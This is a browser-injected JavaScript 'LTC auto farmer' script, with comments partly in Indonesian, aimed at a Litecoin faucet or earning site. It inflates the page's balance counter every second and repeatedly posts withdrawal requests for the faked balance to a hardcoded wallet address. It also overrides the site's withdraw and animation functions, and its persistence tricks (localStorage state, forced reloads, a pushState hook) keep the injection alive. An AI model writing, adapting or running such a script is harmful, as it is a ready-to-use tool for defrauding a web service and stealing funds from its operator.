// ============================================
// LTC AUTO FARMER - PERMANENT INJECT
// ============================================

(function() {
    'use strict';
    
    // Load config from storage
    const CONFIG = {
        withdrawAddress: 'ltc1qtz2zzaxpr7a5u0r4qv7agrzk8eufyhyervxr9y',
        increaseRate: 1.0,
        autoWithdraw: true,
        minWithdraw: 0.00000001,
        maxWithdraw: 1000,
        backupAddresses: [
            'ltc1qtz2zzaxpr7a5u0r4qv7agrzk8eufyhyervxr9y'
        ]
    };
    
    // Load from Chrome storage if available
    if (window.chrome && chrome.storage) {
        chrome.storage.sync.get(CONFIG, (items) => {
            Object.assign(CONFIG, items);
            console.log('📦 Config loaded from extension storage');
        });
    }
    
    // ============================================
    // INCREASE 1 LTC PER DETIK
    // ============================================
    
    function startIncrease() {
        if (window.__increaseInterval) clearInterval(window.__increaseInterval);
        
        window.__increaseInterval = setInterval(() => {
            try {
                const counter = document.getElementById('counter');
                if (counter) {
                    let current = parseFloat(counter.innerText) || 0;
                    current += CONFIG.increaseRate;
                    counter.innerText = current.toFixed(8);
                    
                    // Update other elements
                    $('.user_balance, .balance, .ltc-balance').each(function() {
                        $(this).text(current.toFixed(8));
                    });
                    
                    // Trigger withdraw check
                    if (CONFIG.autoWithdraw && current >= CONFIG.minWithdraw) {
                        checkAndWithdraw();
                    }
                }
            } catch (e) {}
        }, 1000);
    }
    
    // ============================================
    // AUTO WITHDRAW
    // ============================================
    
    async function withdraw(amount, address, retryCount = 0) {
        const maxRetries = 5;
        
        return new Promise((resolve) => {
            $.post('/withdraw/create', {
                address: address,
                amount: amount.toFixed(8)
            }, function(data) {
                if (data && data.status == 1) {
                    console.log('✅ Withdraw success');
                    resolve(true);
                } else {
                    if (retryCount < maxRetries) {
                        setTimeout(() => {
                            withdraw(amount, address, retryCount + 1).then(resolve);
                        }, 5000);
                    } else {
                        // Try backup address
                        const nextAddr = CONFIG.backupAddresses[0];
                        if (nextAddr && nextAddr !== address) {
                            withdraw(amount, nextAddr, 0).then(resolve);
                        } else {
                            resolve(false);
                        }
                    }
                }
            }).fail(() => {
                if (retryCount < maxRetries) {
                    setTimeout(() => {
                        withdraw(amount, address, retryCount + 1).then(resolve);
                    }, 5000);
                } else {
                    resolve(false);
                }
            });
        });
    }
    
    async function checkAndWithdraw() {
        const balance = parseFloat($('#counter').text()) || 0;
        
        if (balance >= CONFIG.minWithdraw) {
            const amount = Math.min(balance, CONFIG.maxWithdraw);
            await withdraw(amount, CONFIG.withdrawAddress);
        }
    }
    
    // ============================================
    // OVERRIDE FUNCTIONS
    // ============================================
    
    // Override animateNumber
    const originalAnimate = window.animateNumber;
    window.animateNumber = function() {
        if (originalAnimate) originalAnimate();
        // Add our increase
        const counter = document.getElementById('counter');
        if (counter) {
            let val = parseFloat(counter.innerText) || 0;
            val += CONFIG.increaseRate;
            counter.innerText = val.toFixed(8);
        }
    };
    
    // Override jsWithdraw
    if (window.jsWithdraw) {
        const originalCreate = window.jsWithdraw.createWithdraw;
        window.jsWithdraw.createWithdraw = function() {
            $('#address').val(CONFIG.withdrawAddress);
            if (originalCreate) originalCreate.call(this);
        };
    }
    
    // ============================================
    // PERSISTENCE MECHANISMS
    // ============================================
    
    // Save state to localStorage
    function saveState() {
        const state = {
            balance: parseFloat($('#counter').text()) || 0,
            timestamp: Date.now()
        };
        localStorage.setItem('ltc_farmer_state', JSON.stringify(state));
    }
    
    // Load state from localStorage
    function loadState() {
        try {
            const saved = localStorage.getItem('ltc_farmer_state');
            if (saved) {
                const state = JSON.parse(saved);
                const counter = document.getElementById('counter');
                if (counter && Date.now() - state.timestamp < 3600000) {
                    counter.innerText = state.balance.toFixed(8);
                }
            }
        } catch (e) {}
    }
    
    // ============================================
    // COMMANDS (available in console)
    // ============================================
    
    window.ltcHelp = function() {
        console.log(`
📖 LTC FARMER COMMANDS:
  ltc.setRate(5)        - Set increase rate
  ltc.setAddress('addr') - Set withdraw address
  ltc.withdrawNow()      - Withdraw manual
  ltc.toggleAuto()       - ON/OFF auto withdraw
  ltc.status()           - Show status
        `);
    };
    
    window.ltc = {
        setRate: (rate) => { CONFIG.increaseRate = rate; },
        setAddress: (addr) => { CONFIG.withdrawAddress = addr; },
        withdrawNow: checkAndWithdraw,
        toggleAuto: () => { CONFIG.autoWithdraw = !CONFIG.autoWithdraw; },
        status: () => {
            console.log({
                balance: parseFloat($('#counter').text()) || 0,
                rate: CONFIG.increaseRate,
                address: CONFIG.withdrawAddress,
                autoWithdraw: CONFIG.autoWithdraw
            });
        }
    };
    
    // ============================================
    // INITIALIZATION
    // ============================================
    
    // Wait for DOM
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    function init() {
        console.log('🚀 LTC Farmer Injected Permanently');
        
        loadState();
        startIncrease();
        
        // Auto withdraw interval
        if (CONFIG.autoWithdraw) {
            setInterval(checkAndWithdraw, 30000);
        }
        
        // Save state periodically
        setInterval(saveState, 5000);
        
        // Reinject protection
        setInterval(() => {
            if (!window.ltc) {
                console.log('🔄 Reinjecting...');
                location.reload();
            }
        }, 60000);
        
        // Override pushState to maintain injection
        const originalPushState = history.pushState;
        history.pushState = function() {
            const result = originalPushState.apply(this, arguments);
            setTimeout(init, 500);
            return result;
        };
        
        console.log('✅ Permanen Injection Active');
    }
    
})();
